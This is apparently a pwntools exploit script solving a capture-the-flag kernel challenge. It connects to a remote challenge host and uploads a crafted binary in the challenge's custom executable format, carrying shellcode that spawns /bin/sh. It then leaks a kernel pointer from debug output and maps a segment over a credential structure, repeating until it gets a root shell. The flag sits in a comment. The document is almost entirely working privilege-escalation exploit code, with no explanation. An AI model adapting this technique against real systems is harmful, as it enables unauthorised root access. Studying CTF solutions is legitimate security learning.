#!/usr/bin/env python
# coding: utf-8

from pwn import *
from os.path import basename
import base64

context.arch = 'amd64'
PAGE_MASK = 0xFFFFFFFFFFFFF000

# p4{4r3_y0U_4_81n4ry_N1njA?}

# segment = (addr, length, prot, is_load, payload)

def pack_p4(segments, entry, one_segment=False):
	offset = 0x18 + len(segments) * 0x18
	seg_header = ''
	data = ''
	for s in segments:
		addr, length, prot, is_load, payload = s
		addr = addr | prot
		if not is_load:
			addr |= 0x8
		seg_header += p64(addr) + p64(length) + p64(offset & PAGE_MASK)
		offset += len(payload)
		data += payload
	one = '\x00' if one_segment else '\x01'
	return 'P4' + '\0' + one + p32(len(segments)) + p64(0x18) + p64(entry) + seg_header + data

sc = shellcraft.amd64.linux
code = asm(sc.write(1, 'Hello World!', 12) + sc.execve('/bin/sh', ['/bin/sh']))
code += '\xf4'

ar_read = 'P4' + '\0' + '\x01' + p32(0x1) + p64(0x90 & 0xFFFFFFFFFFFFFFFF) + p64(0x0)
open('read.p4', 'wb').write(ar_read)
os.chmod('read.p4', 0755)


p = remote('p4fmt.zajebistyc.tf', 30002)

context.log_level = 'debug'

def put_binary(path):
	data = base64.encodestring(open(path, 'rb').read())
	data = data.replace('\r', '').replace('\n', '')
	name = basename(path)
	for i in range(0, len(data), 0x200):
		p.recvuntil('/ $')
		p.sendline('echo "{}" >> /tmp/{}.b64'.format(data[i:i+0x200], name))
	p.sendline('base64 -d /tmp/{}.b64 > /tmp/{}'.format(name, name))
	p.recvuntil('/ $')
	p.sendline('chmod +x /tmp/{}'.format(name))


put_binary('read.p4')

for i in range(10):
	p.recvuntil('/ $')
	p.sendline('/tmp/read.p4')

p.recvuntil('/ $')
p.sendline('/tmp/read.p4')
p.recvuntil('] vm_mmap(load_addr=')
p.recvuntil(', length=')
kptr = int(p.recvuntil(',',drop=True), 16)
print('[+] kptr: %#x' % kptr)

for i in range(4):
	p.recvuntil('/ $')
	p.sendline('/tmp/read.p4')
	
segments = [(0x400000, len(code), 7, True, code), (kptr+0x30, 0x28, 0, False, 'AAAA')]
file_data = pack_p4(segments, 0x400048)
open('test.p4', 'wb').write(file_data)
put_binary('test.p4')

# Wait for next kptr
for i in range(100):
	p.recvuntil('/ $')
	p.sendline('/tmp/read.p4')
	p.recvuntil('] vm_mmap(load_addr=')
	p.recvuntil(', length=')
	addr = int(p.recvuntil(',', drop=True), 16)
	print('[+] cred @ %#x' % addr)
	if addr == kptr:
		break

for i in range(4):
	p.recvuntil('/ $')
	p.sendline('/tmp/read.p4')

# Wait for root shell
for i in range(100):
	p.recvuntil('/ $')
	p.sendline('/tmp/test.p4')
	data = p.recvuntil('/ ')
	if not 'Hello World' in data:
		continue
	pro = p.recv(1)
	if pro == '#':
		print('[!] Root shell!')
		p.interactive()
		break
	else:
		p.sendline('exit')

print('[*] Root failed')
p.interactive()
